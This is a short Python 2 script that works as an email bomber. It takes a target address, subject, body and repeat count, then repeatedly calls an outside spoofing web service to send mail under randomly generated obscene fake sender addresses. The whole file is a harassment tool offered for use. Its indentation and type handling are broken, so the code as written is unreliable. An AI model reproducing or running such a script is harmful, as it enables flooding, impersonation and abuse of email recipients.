import sys, urllib, os, random, time
destEmail = raw_input("Destination Email: ")
emailSubject = raw_input("Email Subject: ")
emailBody = raw_input("Email Body: ")
noTimes = raw_input("Number of Times: ")
timeSleep = input("Time to sleep in secs / email? (1 for gmail): ")
confirmation = raw_input("Send? y/n: ")
if confirmation == "n":
    sys.exit()
elif confirmation == "y":
    count = 0
    print "Sending Emails..."
    while count < noTimes:
  spoofEmail = "dirtywhore" + str(random.randint(0, 10000)) + "@irresistablesluts.com"
  urllib.urlopen("http://www.xparadox.co.uk/mycloud/spoof.php?spoof=" + spoofEmail + "&target=" + destEmail + "&reply=" + spoofEmail + "&title=" + emailSubject + "&body=" + emailBody + "&submit=Submit")
  print int(count)+1
  count+=1
  time.sleep(int(timeSleep))
  if count == int(noTimes):
  print "Finished. Have a nice day! :D"
  sys.exit() 